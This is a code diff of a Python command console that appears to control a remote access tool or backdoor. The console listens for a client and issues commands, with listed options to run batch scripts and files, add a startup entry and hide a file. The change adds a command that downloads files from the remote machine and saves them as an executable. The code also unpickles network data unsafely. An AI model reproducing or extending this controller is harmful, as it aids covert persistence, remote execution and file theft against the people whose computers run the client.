@@ -4,7 +4,7 @@ from time import sleep
 
 class Socket:
 
-    header = 10
+    header = 20
     established = False
 
     def __init__(self, ip_address, port):
@@ -33,9 +33,12 @@ class Socket:
             return False
         if "-batch" in command.decode() or "cd.." in command.decode() or "cd" in command.decode():
             return
+        if "-download" in command.decode():
+            self.receive_command_output(download=True)
+            return
         self.receive_command_output()
 
-    def receive_command_output(self):
+    def receive_command_output(self, download=False):
         full_msg = b''
         new_msg = True
         while True:
@@ -50,8 +53,14 @@ class Socket:
                 new_msg = False
             full_msg += msg_rec
             if len(full_msg) - self.header == msg_len:
-                full_msg = loads(full_msg[self.header:])
-                print(full_msg)
+                if not download:
+                    full_msg = loads(full_msg[self.header:])
+                    print(full_msg)
+                else:
+                    full_msg = full_msg[self.header:]
+                    new_file = open("new_file.exe", "wb+")
+                    new_file.write(full_msg)
+                    new_file.close()
                 return True
 
 
@@ -60,11 +69,13 @@ print("\nexecute batch: -batch [args] [script(new line = /n)]")
 print("execute file: -e")
 print("startup file -s")
 print("hide file -h")
+print("Download file -download file_name")
 while True:
     if not connection.established:
         connection.listen_to_for_client()
     user_input = input("> ")
-    connection.send_command(user_input)
+    if user_input != ' ' and user_input != '':
+        connection.send_command(user_input)
     sleep(1)
 
 
